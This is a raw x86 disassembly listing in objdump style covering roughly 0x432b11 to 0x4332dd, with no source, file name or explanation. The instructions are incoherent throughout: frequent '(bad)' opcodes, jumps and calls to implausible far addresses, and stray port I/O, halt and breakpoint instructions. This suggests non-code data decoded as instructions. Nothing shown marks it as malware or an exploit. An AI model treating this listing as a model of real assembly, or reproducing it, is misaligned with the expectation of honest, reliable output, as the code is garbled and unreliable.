  432b11:	ud0    ecx,DWORD PTR [ecx]
  432b14:	mov    eax,edx
  432b16:	lods   al,BYTE PTR ds:[esi]
  432b17:	add    BYTE PTR [eax],al
  432b19:	data16 (bad) 
  432b1b:	iret   
  432b1c:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  432b23:	cli    
  432b24:	inc    ebp
  432b25:	cmp    al,0x8d
  432b27:	add    BYTE PTR [esi+0x2d],ah
  432b2a:	inc    ebp
  432b2b:	pop    ebp
  432b2c:	lea    ecx,[edi]
  432b2e:	mov    dl,bh
  432b30:	add    BYTE PTR [edi],cl
  432b32:	mov    DWORD PTR [eax+eax*8],edi
  432b35:	mov    ebx,0x3b87
  432b3a:	add    BYTE PTR [ebx],ch
  432b3c:	inc    ebp
  432b3d:	data16 (bad) 
  432b3f:	clc    
  432b40:	int3   
  432b41:	cmp    eax,DWORD PTR [eax]
  432b43:	je     0x432ace
  432b45:	push   0xffffffc8
  432b47:	pop    edi
  432b48:	xchg   DWORD PTR [ebp+0x0],eax
  432b4b:	data16 add BYTE PTR [ebp+0x45],cl
  432b4f:	lea    cx,[ebp+0x10]
  432b53:	jb     0x432b55
  432b55:	jmp    0x432ae0
  432b57:	call   eax
  432b59:	clc    
  432b5a:	xchg   DWORD PTR [edi+0x1],edi
  432b5d:	mov    eax,DWORD PTR [eax]
  432b5f:	or     BYTE PTR [ebp-0x49],al
  432b62:	lea    eax,[eax+0x74003154]
  432b68:	push   edi
  432b69:	inc    edx
  432b6a:	jge    0x432b6b
  432b6c:	mov    DWORD PTR [edi],ecx
  432b6e:	fdiv   DWORD PTR [edi-0x6]
  432b71:	inc    DWORD PTR [eax]
  432b73:	xor    edx,DWORD PTR [eax+0x5f]
  432b76:	xchg   DWORD PTR [ebx+0x1],ebx
  432b79:	ret    0x0
  432b7c:	xor    BYTE PTR [ebp-0x51],cl
  432b7f:	cmp    edi,0xf0ff89fe
  432b85:	data16 ror al,0x84
  432b89:	rol    BYTE PTR [eax],0x3b
  432b8c:	add    al,dh
  432b8e:	dec    eax
  432b8f:	xchg   esp,eax
  432b90:	push   ebx
  432b91:	jmp    0x432b1e
  432b93:	push   ebp
  432b94:	add    esp,ebp
  432b96:	add    ebp,esp
  432b98:	mov    edx,DWORD PTR [edi+0x24]
  432b9b:	clc    
  432b9c:	dec    esi
  432b9d:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  432ba3:	cmp    BYTE PTR [ebx],al
  432ba5:	jne    0x432b30
  432ba7:	xor    esp,eax
  432ba9:	jmp    0x462d2c
  432bae:	add    ebp,DWORD PTR [ecx+ecx*4]
  432bb1:	jne    0x432ba7
  432bb3:	call   0xffcd290d
  432bb8:	clc    
  432bb9:	xchg   edi,eax
  432bba:	sti    
  432bbb:	add    DWORD PTR [ebx],eax
  432bbd:	add    BYTE PTR [ebp+0x47],bl
  432bc0:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  432bc6:	pop    ebp
  432bc7:	mov    DWORD PTR [esi-0x48],esi
  432bca:	jmp    0x432c13
  432bcc:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  432bd2:	(bad)  
  432bd4:	cmp    al,0x0
  432bd6:	cmp    eax,DWORD PTR [ebp+0x18]
  432bd9:	lea    ebx,[ebp-0x56]
  432bdc:	jle    0x432bde
  432bde:	jae    0x432b69
  432be0:	mov    eax,esp
  432be2:	call   0xb900:0x8b005587
  432be9:	inc    ebp
  432bea:	push   ebp
  432beb:	lea    ecx,[ebp-0x27ff4f12]
  432bf1:	mov    eax,edi
  432bf3:	int3   
  432bf4:	push   ebp
  432bf5:	xchg   edi,eax
  432bf7:	add    esp,ebp
  432bf9:	add    BYTE PTR [eax],al
  432bfb:	inc    ebp
  432bfc:	add    BYTE PTR [ebp+0x8b3255],cl
  432c02:	cld    
  432c03:	mov    DWORD PTR [edx],edi
  432c05:	aam    0x75
  432c07:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  432c0d:	mov    DWORD PTR [ebx-0x50],edx
  432c10:	test   BYTE PTR [ebp-0x1],0xe8
  432c14:	mov    eax,DWORD PTR [eax]
  432c16:	hlt    
  432c17:	add    al,al
  432c19:	mov    eax,DWORD PTR ds:0x890045a8
  432c1f:	dec    DWORD PTR [ebx+0x45fdf0e8]
  432c25:	inc    DWORD PTR [eax*2+0xf75854d]
  432c2c:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  432c32:	call   0x72998973
  432c37:	je     0x432c97
  432c39:	js     0x432c9a
  432c3b:	lock ret 0x7e
  432c3f:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  432c45:	mov    edi,edi
  432c47:	sbb    al,bl
  432c49:	clc    
  432c4a:	add    BYTE PTR [ebp-0x73],bh
  432c4d:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  432c53:	ror    BYTE PTR [eax],1
  432c55:	dec    ebp
  432c56:	xchg   ebp,eax
  432c57:	mov    edi,edi
  432c59:	in     al,0x8b
  432c5b:	jge    0x432be6
  432c5d:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  432c63:	clc    
  432c64:	pop    esi
  432c65:	fist   DWORD PTR [ebp+0x5d398b5d]
  432c6b:	clc    
  432c6c:	add    al,0x6e
  432c6e:	mov    eax,DWORD PTR [ebx]
  432c70:	mov    BYTE PTR [ebp+0x0],dl
  432c73:	mov    edx,DWORD PTR [ebx-0x20]
  432c76:	adc    esi,DWORD PTR [edi+0x5e005f3c]
  432c7c:	add    eax,0x3b3b73
  432c81:	adc    al,0x89
  432c83:	pop    eax
  432c84:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  432c88:	ret    0xf08
  432c8b:	cmp    al,0x2
  432c8d:	mov    edx,eax
  432c8f:	cld    
  432c90:	add    BYTE PTR [ebp+0x66],dl
  432c93:	add    eax,ebx
  432c95:	add    esp,eax
  432c97:	sub    eax,eax
  432c99:	or     BYTE PTR [ecx-0x77f474bb],cl
  432c9f:	add    BYTE PTR [eax],al
  432ca1:	mov    DWORD PTR [ebx-0x24],ebx
  432ca4:	push   edi
  432ca5:	push   ebp
  432ca6:	clc    
  432ca7:	add    DWORD PTR [esi+0x1b0100],0x45
  432cae:	out    0xff,eax
  432cb0:	add    edx,DWORD PTR [eax]
  432cb2:	jmp    0x432c9c
  432cb4:	cmp    ch,0x46
  432cb7:	(bad)  
  432cb8:	jmp    0x40c8b50a
  432cbd:	je     0x432c49
  432cbf:	mov    eax,DWORD PTR [eax-0x10c78104]
  432cc5:	inc    ebp
  432cc6:	add    BYTE PTR [ebx-0x770375],al
  432ccc:	add    ah,ch
  432cce:	add    edx,esp
  432cd0:	pop    edi
  432cd1:	pop    ebp
  432cd2:	push   ebp
  432cd3:	inc    ebx
  432cd4:	in     al,dx
  432cd5:	pop    ebp
  432cd6:	in     al,dx
  432cd7:	cmp    edx,DWORD PTR [edi-0x8]
  432cda:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  432ce1:	add    al,0x47
  432ce3:	push   ebp
  432ce4:	mov    esp,ebp
  432ce6:	in     al,0x45
  432ce8:	dec    ebp
  432ce9:	push   esi
  432cea:	test   DWORD PTR [eax+0xfb010f],esi
  432cf0:	add    BYTE PTR [eax+0xc018b],dh
  432cf6:	leave  
  432cf7:	inc    ebp
  432cf8:	test   al,ch
  432cfa:	add    dh,bh
  432cfc:	add    bh,bh
  432cfe:	dec    ebp
  432cff:	push   cs
  432d00:	mov    DWORD PTR [ecx],eax
  432d02:	hlt    
  432d03:	push   es
  432d04:	dec    ebp
  432d05:	leave  
  432d06:	mov    DWORD PTR [eax],ecx
  432d08:	clc    
  432d09:	cmovge eax,ecx
  432d0c:	mov    ecx,0x85c2f0
  432d12:	clc    
  432d13:	pop    DWORD PTR [ebp+0x1]
  432d16:	push   ebx
  432d17:	add    BYTE PTR [ebp-0x15],bh
  432d1a:	push   esi
  432d1b:	xor    eax,0x898a45
  432d20:	cld    
  432d21:	add    al,BYTE PTR [ebp+0x0]
  432d24:	xor    esp,DWORD PTR [esi-0x64]
  432d27:	add    DWORD PTR [esi+0x78308c1],edi
  432d2d:	add    ah,BYTE PTR [ebp-0x49]
  432d30:	int    0xbb
  432d32:	mov    ecx,DWORD PTR [esi+0xc]
  432d35:	add    dh,al
  432d37:	cmp    ecx,ebx
  432d39:	jne    0x432d03
  432d3b:	xor    ecx,DWORD PTR [ebp+0x66]
  432d3e:	jmp    0xca2d44
  432d43:	add    DWORD PTR [ebp+0x0],eax
  432d46:	mov    eax,ebx
  432d48:	or     al,0x8b
  432d4a:	(bad)  
  432d4b:	mov    ecx,esi
  432d4d:	mov    BYTE PTR [eax+eax*1+0x664c136],cl
  432d54:	mov    eax,edi
  432d56:	or     BYTE PTR [edx],cl
  432d58:	shl    cl,cl
  432d5a:	icebp  
  432d5b:	add    BYTE PTR [ebp+0x38],0x8b
  432d5f:	or     BYTE PTR [edx+eax*2],cl
  432d62:	(bad)  
  432d63:	or     cl,dh
  432d65:	stc    
  432d66:	shl    DWORD PTR [ebp-0x30],0xc6
  432d6a:	xor    al,0x0
  432d6c:	inc    ebp
  432d6d:	xchg   BYTE PTR [ebx],al
  432d6f:	add    esp,edi
  432d71:	add    BYTE PTR [ebp-0x39],cl
  432d74:	mov    al,bl
  432d76:	test   DWORD PTR [ebx+0x1c348375],ecx
  432d7c:	sub    al,0xbf
  432d7e:	jmp    0x432d05
  432d80:	mov    edi,eax
  432d82:	lock jge 0x432d76
  432d85:	lea    esi,[edx-0x74bad5ff]
  432d8b:	mov    ebp,esp
  432d8d:	or     cl,dh
  432d8f:	leave  
  432d90:	add    al,BYTE PTR [eax+eax*4-0x37ff9b00]
  432d97:	dec    ebp
  432d98:	dec    ebp
  432d99:	test   DWORD PTR [ebx],eax
  432d9b:	paddb  mm6,mm0
  432d9e:	add    DWORD PTR [eax],eax
  432da0:	dec    ebp
  432da1:	mov    ecx,DWORD PTR [ebx-0x64b217f0]
  432da7:	mov    esi,DWORD PTR [edx]
  432da9:	or     al,0x2b
  432dab:	dec    ebp
  432dac:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  432db2:	mov    esp,edi
  432db4:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  432dbb:	mov    DWORD PTR [ebx],ebp
  432dbd:	call   0xc76b6ed
  432dc2:	mov    DWORD PTR [ebp+0x10],ecx
  432dc5:	(bad)  
  432dc6:	push   0x8b85ff10
  432dcb:	clc    
  432dcc:	or     al,0x54
  432dce:	(bad)  
  432dcf:	push   ecx
  432dd0:	retf   
  432dd1:	mov    ebx,0xff4d8dc8
  432dd6:	mov    DWORD PTR [ebp+0x8],eax
  432dd9:	xor    eax,DWORD PTR [ebp-0x75]
  432ddc:	cmp    ebp,DWORD PTR [ebx]
  432dde:	lsl    ebx,WORD PTR [edi-0x8]
  432de2:	call   DWORD PTR [ebx-0x741bff75]
  432de8:	(bad)  
  432de9:	or     al,0x5b
  432deb:	dec    ebp
  432dec:	or     BYTE PTR [ebx],dh
  432dee:	inc    ebp
  432def:	xor    esi,DWORD PTR ds:0x708088d
  432df5:	in     eax,0x9b
  432df7:	add    BYTE PTR [edx],dh
  432df9:	inc    ebp
  432dfa:	pop    edi
  432dfb:	xor    eax,edx
  432dfd:	test   DWORD PTR [eax],0x81108b8b
  432e03:	dec    ebp
  432e04:	sub    al,0x33
  432e06:	add    BYTE PTR [ebx],dh
  432e08:	push   esi
  432e09:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  432e0f:	mov    edi,eax
  432e11:	or     BYTE PTR [ebp+0x45],al
  432e14:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  432e1a:	xor    ecx,ecx
  432e1c:	pushf  
  432e1d:	push   es
  432e1e:	mov    DWORD PTR [esi-0x4],0xf8178538
  432e25:	dec    ebp
  432e26:	inc    ebp
  432e27:	cmp    BYTE PTR [ecx],0x54
  432e2a:	pushf  
  432e2b:	gs (bad) 
  432e2d:	shl    esp,1
  432e2f:	dec    ebp
  432e30:	xchg   BYTE PTR [eax-0x3dbaab08],al
  432e36:	shr    ecx,1
  432e38:	xlat   BYTE PTR ds:[ebx]
  432e39:	rol    bh,cl
  432e3b:	mov    edx,esp
  432e3d:	or     BYTE PTR [ebp+0x4588f84d],al
  432e43:	mov    ecx,DWORD PTR [eax]
  432e45:	or     BYTE PTR [eax],al
  432e47:	push   ebp
  432e48:	mov    edi,DWORD PTR [eax+0xfc728b]
  432e4e:	dec    ebp
  432e4f:	enter  0xceba,0x8
  432e53:	retf   0x1807
  432e56:	ret    0x9b4d
  432e59:	mov    esi,DWORD PTR [edx]
  432e5b:	or     al,0x33
  432e5d:	into   
  432e5e:	add    edx,esi
  432e60:	add    ecx,edx
  432e62:	bswap  eax
  432e64:	ror    esi,0x98
  432e67:	dec    ebp
  432e68:	add    cl,ch
  432e6a:	mov    edi,edi
  432e6c:	hlt    
  432e6d:	inc    esi
  432e6f:	inc    ebp
  432e70:	ret    0x4533
  432e73:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  432e79:	or     BYTE PTR [ebx],dh
  432e7b:	dec    ebp
  432e7c:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  432e82:	jne    0xff8d2e49
  432e88:	inc    ebp
  432e89:	inc    ebp
  432e8a:	mov    esi,DWORD PTR [ebx]
  432e8c:	clc    
  432e8d:	pop    esi
  432e8e:	ret    0xcaeb
  432e91:	mov    eax,esi
  432e93:	call   0x52048366
  432e98:	dec    ebp
  432e99:	add    eax,0xf8728b
  432e9e:	adc    eax,0xce0ccac9
  432ea3:	push   ebp
  432ea4:	ret    0xc6ec
  432ea7:	in     al,dx
  432ea8:	call   0x33437bb1
  432ead:	push   edi
  432eae:	add    edi,eax
  432eb0:	xor    eax,eax
  432eb2:	jmp    0x432ef9
  432eb4:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  432eba:	add    eax,edi
  432ebc:	shr    eax,cl
  432ebe:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  432ec4:	mov    esi,DWORD PTR [edx]
  432ec6:	in     al,dx
  432ec7:	pushf  
  432ec8:	ret    0x84c7
  432ecb:	fcomp  DWORD PTR [ebx-0x7607cd7b]
  432ed1:	inc    ebp
  432ed2:	in     al,dx
  432ed3:	xor    DWORD PTR [ebp-0x64],eax
  432ed6:	mov    eax,edi
  432ed8:	cld    
  432ed9:	fmul   st(2),st
  432edb:	sbb    dl,al
  432edd:	jmp    0x9c3b:0x304d45c1
  432ee4:	jbe    0x432ead
  432ee6:	mov    esp,eax
  432ee8:	clc    
  432ee9:	add    BYTE PTR [ebp+0x0],cl
  432eec:	mov    ecx,ecx
  432eee:	lea    eax,[ebp-0x5]
  432ef1:	mov    edi,edi
  432ef3:	call   0x51ce833d
  432ef8:	hlt    
  432ef9:	xor    eax,edx
  432efb:	mov    esi,0x9b7284
  432f00:	xor    cl,dl
  432f02:	mov    esi,eax
  432f04:	hlt    
  432f05:	into   
  432f06:	inc    ebp
  432f07:	scas   eax,DWORD PTR es:[edi]
  432f08:	mov    ebp,ecx
  432f0a:	cld    
  432f0b:	add    dl,cl
  432f0d:	add    dl,al
  432f0f:	inc    ebp
  432f10:	shr    DWORD PTR [ebx],0x4d
  432f13:	xor    edi,DWORD PTR [ebx]
  432f15:	mov    DWORD PTR [edi],ecx
  432f17:	clc    
  432f18:	dec    esi
  432f19:	inc    ebp
  432f1a:	dec    DWORD PTR [ebx-0x3d2b1775]
  432f20:	ret    0xc6ca
  432f23:	mov    BYTE PTR [ebp-0x32],0x53
  432f27:	scas   eax,DWORD PTR es:[edi]
  432f28:	inc    ebp
  432f29:	jmp    0x432f5b
  432f2b:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  432f32:	pop    ebx
  432f33:	xor    ecx,DWORD PTR [ebp+0x3]
  432f36:	mov    eax,DWORD PTR [ebx]
  432f38:	clc    
  432f39:	test   edx,ecx
  432f3b:	mov    ecx,esi
  432f3d:	cld    
  432f3e:	call   0x8ab77488
  432f43:	xor    ecx,DWORD PTR [eax+0x4533f303]
  432f49:	add    ecx,DWORD PTR [ebx-0x4974072d]
  432f4f:	fdiv   QWORD PTR [ebx]
  432f51:	retf   0xce89
  432f54:	in     al,0xc1
  432f56:	inc    ebp
  432f57:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  432f5d:	into   
  432f5e:	mov    dh,0xc1
  432f61:	call   0x8c1774ea
  432f66:	(bad)  
  432f67:	cld    
  432f68:	mov    ecx,DWORD PTR [ebp-0x14]
  432f6b:	xor    eax,ecx
  432f6d:	lea    eax,[ebp+0x8]
  432f70:	mov    esi,DWORD PTR [edx-0x4]
  432f73:	add    dl,al
  432f75:	inc    ebp
  432f76:	mov    esp,0x32d89b8b
  432f7b:	dec    ebp
  432f7c:	mov    esi,DWORD PTR [ebx]
  432f7e:	cld    
  432f7f:	xor    eax,edx
  432f81:	sub    esp,DWORD PTR [ebp-0x75]
  432f84:	int    0xec
  432f86:	sub    ecx,eax
  432f88:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  432f8e:	mov    esi,esp
  432f90:	call   0x34177d19
  432f95:	inc    DWORD PTR [ebx]
  432f97:	mov    edi,DWORD PTR [ebx]
  432f99:	cld    
  432f9a:	jne    0x432fe9
  432f9c:	mov    esi,DWORD PTR [ebx]
  432f9e:	aam    0x8d
  432fa0:	dec    ebp
  432fa1:	or     BYTE PTR [ebx],dh
  432fa3:	jb     0x432fa8
  432fa5:	add    BYTE PTR [edi+0x45],bl
  432fa8:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  432faf:	xor    ebp,esp
  432fb1:	xor    eax,edi
  432fb3:	sub    edi,esp
  432fb5:	mov    eax,DWORD PTR [ebp+0x32c8f8f4]
  432fbb:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  432fc2:	inc    ebp
  432fc3:	xor    ecx,DWORD PTR [ecx+0x45891403]
  432fc9:	clc    
  432fca:	mov    eax,edi
  432fcc:	nop
  432fcd:	fadd   QWORD PTR [eax]
  432fcf:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  432fd5:	jmp    0x432f60
  432fd7:	mov    eax,DWORD PTR [ecx]
  432fd9:	fadd   DWORD PTR [eax]
  432fdb:	inc    ebp
  432fdc:	or     DWORD PTR [ebx],esi
  432fde:	dec    eax
  432fdf:	add    edx,DWORD PTR [ebx-0x2d]
  432fe2:	dec    ebp
  432fe3:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  432fe9:	inc    ebp
  432fea:	push   esp
  432feb:	mov    dl,BYTE PTR [ecx-0xd]
  432fee:	xor    ecx,DWORD PTR [ebp-0x45]
  432ff1:	(bad)  
  432ff3:	rol    BYTE PTR [eax],0xc1
  432ff6:	ret    
  432ff7:	inc    ebp
  432ff8:	inc    ebp
  432ff9:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  432fff:	xor    eax,ebx
  433001:	add    eax,DWORD PTR [ebp+0x23]
  433004:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  43300a:	cmp    edi,0xc
  43300d:	dec    ebp
  43300e:	inc    ebp
  43300f:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  433015:	inc    ebp
  433016:	mov    esi,DWORD PTR [ebx]
  433018:	clc    
  433019:	lea    eax,[ebp+0x45725407]
  43301f:	add    BYTE PTR [ebp+eax*2-0x75],dh
  433023:	xor    edi,DWORD PTR [eax]
  433025:	mov    ecx,0xff8b8d4d
  43302a:	push   esp
  43302b:	enter  0x4df7,0x23
  43302f:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  433035:	mov    eax,DWORD PTR [ebx]
  433037:	loopne 0x433024
  433039:	ret    0xc68b
  43303c:	push   esp
  43303d:	enter  0x9745,0x8b
  433041:	inc    ebp
  433042:	cld    
  433043:	mov    eax,edi
  433045:	clc    
  433046:	ret    
  433047:	ret    0xc645
  43304a:	mov    esi,DWORD PTR [ebx]
  43304c:	cld    
  43304d:	pop    esi
  43304e:	mov    ebx,0x83458bc3
  433054:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  433058:	dec    ebp
  433059:	xor    DWORD PTR [ebx],esi
  43305b:	pushf  
  43305c:	add    edi,DWORD PTR [edx-0x7767a77]
  433062:	fcom   DWORD PTR [ebp+0x45]
  433065:	mov    esi,DWORD PTR [ebx]
  433067:	adc    al,0x9c
  433069:	inc    ebp
  43306a:	(bad)  
  43306b:	mov    ebx,eax
  43306d:	adc    al,0x85
  43306f:	cmp    al,0x1
  433072:	inc    ebp
  433073:	add    BYTE PTR ds:0xe98b9c4d,bh
  433079:	mov    eax,DWORD PTR [ebx]
  43307b:	nop
  43307c:	add    BYTE PTR [eax],al
  43307e:	inc    ebp
  43307f:	mov    esi,DWORD PTR [ebx]
  433081:	add    eax,DWORD PTR [ebx]
  433083:	cmp    al,0x89
  433085:	mov    esp,esi
  433087:	clc    
  433088:	inc    ebp
  433089:	inc    ebp
  43308a:	add    edx,DWORD PTR [esi+0xc]
  43308d:	mov    edi,0x7ff0845
  433092:	in     al,dx
  433093:	(bad)  
  433094:	jne    0x433031
  433096:	mov    esi,DWORD PTR [edx]
  433098:	clc    
  433099:	add    ebp,DWORD PTR [esi]
  43309b:	mov    edi,edi
  43309d:	in     al,dx
  43309e:	mov    DWORD PTR [ebp-0x10],eax
  4330a1:	xor    eax,DWORD PTR [ebp+0x3]
  4330a4:	cmp    DWORD PTR [ecx+0x458bf49c],ecx
  4330aa:	fmul   DWORD PTR [ebx-0x173caf39]
  4330b0:	lea    ecx,[ecx+0x45e8d4bc]
  4330b6:	clc    
  4330b7:	mov    edi,edi
  4330b9:	cmp    BYTE PTR [ebp+0x4d],al
  4330bc:	test   DWORD PTR [eax+0x74],ecx
  4330bf:	inc    ecx
  4330c0:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  4330c6:	ret    
  4330c7:	inc    eax
  4330c8:	dec    DWORD PTR [ebx+0x4945f8f0]
  4330ce:	push   eax
  4330cf:	dec    eax
  4330d0:	test   al,0xd0
  4330d2:	dec    eax
  4330d4:	mov    eax,DWORD PTR [ebp-0x14]
  4330d7:	mov    eax,DWORD PTR [ebp+0x38]
  4330da:	mov    eax,ecx
  4330dc:	fadd   DWORD PTR [ebx]
  4330de:	dec    ebp
  4330df:	inc    eax
  4330e0:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  4330e6:	inc    ebp
  4330e7:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  4330ed:	fadd   QWORD PTR [ebx]
  4330ef:	inc    ebp
  4330f0:	or     al,0x33
  4330f2:	dec    ebp
  4330f3:	add    edi,DWORD PTR [ebx]
  4330f5:	mov    DWORD PTR [edx-0x28],esi
  4330f8:	mov    eax,DWORD PTR [ebp-0x10]
  4330fb:	mov    eax,DWORD PTR [eax+0x10]
  4330fe:	mov    eax,edi
  433100:	lock ret 
  433102:	inc    ecx
  433103:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  433109:	fsubr  st,st(5)
  43310b:	test   DWORD PTR [eax],eax
  43310d:	clc    
  43310e:	push   0x45
  433110:	(bad)  
  433111:	cmp    al,0xec
  433113:	pushf  
  433114:	inc    ebp
  433115:	(bad)  
  433116:	push   eax
  433117:	fsub   DWORD PTR [eax-0x7b]
  43311a:	(bad)  
  43311b:	clc    
  43311c:	mov    eax,0xf8008584
  433121:	mov    eax,DWORD PTR [ebp-0x4]
  433124:	mov    edi,0x4585c3cc
  43312a:	clc    
  43312b:	mov    eax,DWORD PTR [ebp+0x14]
  43312e:	xor    eax,DWORD PTR [ebp-0x64]
  433131:	mov    edi,eax
  433133:	in     al,dx
  433134:	les    esi,FWORD PTR [ebp-0x7b]
  433137:	mov    edi,eax
  433139:	or     al,0x4d
  43313b:	dec    ebp
  43313c:	mov    eax,ebp
  43313e:	in     al,0xf2
  433140:	dec    ebp
  433141:	dec    DWORD PTR [ecx+0x4dc7e045]
  433147:	fmul   DWORD PTR [ecx+0x4df8f085]
  43314d:	inc    ebp
  43314e:	mov    DWORD PTR [ebx],esi
  433150:	fadd   QWORD PTR [ebx]
  433152:	dec    ebp
  433153:	push   eax
  433154:	xor    eax,DWORD PTR [ebp+0x3]
  433157:	push   eax
  433158:	mov    DWORD PTR [eax+ebx*8],ebx
  43315b:	push   esi
  43315d:	mov    eax,DWORD PTR [eax]
  43315f:	lock cmp eax,0xf84e85c0
  433165:	inc    ebp
  433166:	test   BYTE PTR [ebx],dh
  433168:	add    DWORD PTR [ebx],eax
  43316a:	add    BYTE PTR [eax+0x4d],dl
  43316d:	jne    0x4331a2
  43316f:	lea    ecx,[ebx-0x7617fc44]
  433175:	div    ah
  433177:	inc    DWORD PTR [ebp+0x45]
  43317a:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  433180:	jb     0x43310d
  433182:	add    BYTE PTR [eax*2-0x17ba743f],cl
  433189:	mov    ecx,DWORD PTR [ebp-0x10]
  43318c:	xor    ecx,DWORD PTR [ebp+0x3]
  43318f:	mov    edi,DWORD PTR [ebx]
  433191:	adc    BYTE PTR [ebp+0x41],dh
  433194:	mov    ecx,DWORD PTR [ebx-0x37382704]
  43319a:	ret    
  43319b:	push   ss
  43319c:	push   0x45
  43319e:	lea    ecx,[ebx+0x4de80cb0]
  4331a4:	sti    
  4331a5:	add    edi,edi
  4331a7:	or     BYTE PTR [ebp+0x4d],al
  4331aa:	mov    ebp,DWORD PTR [ebx]
  4331ac:	xor    ebp,ecx
  4331ae:	mov    al,BYTE PTR [edx]
  4331b0:	add    eax,0xc7200
  4331b5:	jne    0x433204
  4331b7:	lea    esi,[ebx]
  4331b9:	mov    al,0xf
  4331bb:	call   0xf2880
  4331c0:	shl    DWORD PTR [ecx],0x84
  4331c3:	pushf  
  4331c4:	add    DWORD PTR [ecx+0x4545d000],ecx
  4331ca:	mov    esi,DWORD PTR [edx]
  4331cc:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  4331d3:	test   DWORD PTR [eax],eax
  4331d5:	clc    
  4331d6:	dec    ebp
  4331d7:	inc    ebp
  4331d8:	xor    edi,DWORD PTR [edi+ecx*1]
  4331db:	pushf  
  4331dc:	ror    BYTE PTR [ebp+0x4dc1d0cb],0x84
  4331e3:	lea    eax,[ecx]
  4331e5:	int3   
  4331e6:	add    BYTE PTR [ebp+0x45],cl
  4331e9:	lea    ecx,[ebx-0x75b2cc38]
  4331ef:	lea    eax,ds:0x4d72c4
  4331f5:	mov    ecx,DWORD PTR [ebp-0x4]
  4331f8:	xor    ecx,edi
  4331fa:	bswap  ebx
  4331fc:	ror    BYTE PTR [ebp-0x35],0xe9
  433200:	rol    DWORD PTR [ecx],0x84
  433203:	add    BYTE PTR [ecx],al
  433205:	xor    eax,DWORD PTR [eax]
  433207:	pushf  
  433208:	inc    ebp
  433209:	jnp    0x8a43660c
  43320f:	mov    eax,DWORD PTR ds:0xcf72e8
  433215:	lock dec ebp
  433217:	retf   
  433218:	xor    ecx,DWORD PTR [ebp+0xf]
  43321b:	mov    eax,eax
  43321d:	fmul   st,st(3)
  43321f:	test   ecx,0x19b8484
  433225:	xor    al,BYTE PTR [eax]
  433227:	mov    DWORD PTR [ebp-0x28],eax
  43322a:	mov    eax,DWORD PTR [ebp+0x33]
  43322d:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  433233:	ret    
  433234:	add    al,cl
  433236:	dec    ebp
  433237:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  43323d:	add    ecx,DWORD PTR ds:0xc7250
  433243:	inc    ebp
  433244:	rcl    DWORD PTR [eax+0x4d],0x2b
  433248:	mov    edi,edi
  43324a:	xor    ecx,DWORD PTR [ebx+0xde48a]
  433250:	jb     0x433219
  433252:	add    BYTE PTR [ecx+eax*8-0x74cdb2b5],al
  433259:	mov    esi,DWORD PTR [ebx]
  43325b:	cld    
  43325c:	mov    cl,bh
  43325e:	or     eax,0x372b6
  433263:	cmp    ecx,eax
  433265:	jne    0x4332e2
  43326b:	mov    eax,DWORD PTR [ebp-0x20]
  43326e:	mov    eax,DWORD PTR [eax]
  433270:	xor    eax,edi
  433272:	mov    al,BYTE PTR [ebp+eax*1+0x32724b]
  433279:	mov    ecx,DWORD PTR [ebp-0x4]
  43327c:	mov    ecx,edi
  43327e:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  433284:	jb     0x433295
  433286:	add    BYTE PTR [edi-0x3f],dl
  433289:	add    BYTE PTR [ebp-0x75],cl
  43328c:	mov    esi,eax
  43328e:	xor    eax,DWORD PTR [eax]
  433290:	mov    al,bh
  433292:	or     eax,0x4b7284
  433297:	xor    al,cl
  433299:	mov    ecx,DWORD PTR [ebp-0x4]
  43329c:	mov    ecx,edi
  43329e:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  4332a4:	jb     0x4332b5
  4332a6:	add    BYTE PTR [edi],dh
  4332a8:	enter  0x8500,0x8b
  4332ac:	add    ah,bl
  4332ae:	add    BYTE PTR [eax],al
  4332b0:	inc    ebp
  4332b1:	(bad)  
  4332b2:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a4b]
  4332b9:	mov    esi,DWORD PTR [edx-0x4]
  4332bc:	add    bh,cl
  4332be:	dec    ebp
  4332bf:	mov    dh,0x8b
  4332c1:	add    esi,DWORD PTR [ebx]
  4332c3:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  4332c9:	add    BYTE PTR [eax],al
  4332cb:	mov    eax,ecx
  4332cd:	loopne 0x43331c
  4332cf:	add    BYTE PTR [ebx-0x757bcc39],cl
  4332d5:	dec    ebx
  4332d6:	or     eax,0x8b7232
  4332db:	in     al,0xc1
  4332dd:	or     DWORD PTR [ebp-0x31],ecx
